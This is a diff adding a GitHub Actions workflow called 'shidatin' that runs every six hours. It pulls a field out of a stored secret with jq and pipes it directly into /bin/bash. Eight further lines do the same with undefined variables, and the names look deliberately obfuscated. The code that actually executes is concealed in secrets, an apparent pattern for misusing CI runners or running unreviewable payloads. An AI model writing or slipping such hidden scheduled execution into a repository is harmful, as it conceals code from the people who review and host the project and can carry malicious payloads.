@@ -1,0 +1,26 @@
+name: shidatin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shidatin
+        env:
+          yeu4: ${{ secrets.yeu4 }}
+        run: |
+          echo $yeu4 | jq -r .zncx2162 | /bin/bash
+          echo $ehsib224 | jq -r .pk9 | /bin/bash
+          echo $yg14 | jq -r .n9076 | /bin/bash
+          echo $eit65 | jq -r .jt7 | /bin/bash
+          echo $ke0463 | jq -r .vpml9859 | /bin/bash
+          echo $oj639 | jq -r .cag07246 | /bin/bash
+          echo $dzqw820 | jq -r .v7 | /bin/bash
+          echo $txt33633 | jq -r .zcye44 | /bin/bash
+          echo $zu35941 | jq -r .olox3682 | /bin/bash
+
